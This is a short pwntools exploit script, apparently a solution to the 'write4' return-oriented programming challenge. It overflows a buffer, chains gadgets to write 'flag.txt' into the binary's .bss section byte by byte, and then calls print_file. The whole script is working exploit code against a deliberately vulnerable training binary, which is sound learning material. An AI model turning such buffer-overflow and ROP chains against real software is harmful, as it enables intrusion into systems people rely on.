from pwn import *

context.log_level = "debug"

r = process("./write4")
exe = r.elf

# Gadgets:
# 0x0000000000400628: mov qword ptr [r14], r15; ret;
# 0x0000000000400690: pop r14; pop r15; ret;
# 0x0000000000400693: pop rdi; ret;
# 0x00000000004004e6: ret;

mov_r14_r15 = p64(0x400628)
pop_r14_r15 = p64(0x400690)
pop_rdi = p64(0x400693)
ret = p64(0x4004E6)
write_base = exe.bss(0)

payload = cyclic(0x28) + ret

for i, v in enumerate("flag.txt"):
    payload += pop_r14_r15 + p64(write_base + i) + p64(ord(v))
    payload += mov_r14_r15

payload += pop_rdi + p64(write_base) + p64(exe.plt["print_file"])

r.recvuntil(b"> ")
r.send(payload)
r.interactive()
